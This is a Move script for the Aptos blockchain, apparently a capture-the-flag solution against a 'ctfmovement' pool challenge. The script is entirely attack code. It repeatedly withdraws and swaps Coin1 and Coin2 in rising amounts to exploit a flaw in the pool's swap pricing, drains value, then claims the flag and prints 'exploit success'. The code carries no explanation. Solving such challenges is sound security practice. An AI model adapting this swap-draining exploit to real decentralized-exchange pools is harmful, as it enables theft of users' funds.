script {
	use std::signer;
	use std::string::{String, utf8};

	use aptos_framework::coin::{Self};
	use aptos_framework::debug;
	
	use ctfmovement::pool::{Self, Coin1, Coin2};

	fun exploit(attacker: &signer) {
		pool::get_coin(attacker);
			
		let coin1 = coin::withdraw<Coin1>(attacker, 5);
		let coin2 = pool::swap_12(&mut coin1, 5);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);
		
		let coin2 = coin::withdraw<Coin2>(attacker, 10);
		let coin1 = pool::swap_21(&mut coin2, 10);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);

		let coin1 = coin::withdraw<Coin1>(attacker, 12);
		let coin2 = pool::swap_12(&mut coin1, 12);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);

		let coin2 = coin::withdraw<Coin2>(attacker, 15);
		let coin1 = pool::swap_21(&mut coin2, 15);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);

		let coin1 = coin::withdraw<Coin1>(attacker, 20);
		let coin2 = pool::swap_12(&mut coin1, 20);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);

		let coin2 = coin::withdraw<Coin2>(attacker, 24);
		let coin1 = pool::swap_21(&mut coin2, 24);
		coin::deposit(signer::address_of(attacker), coin1);
		coin::deposit(signer::address_of(attacker), coin2);

		pool::get_flag(attacker);

		let msg: String = utf8(b"exploit success");
		debug::print(&msg);
	}
}
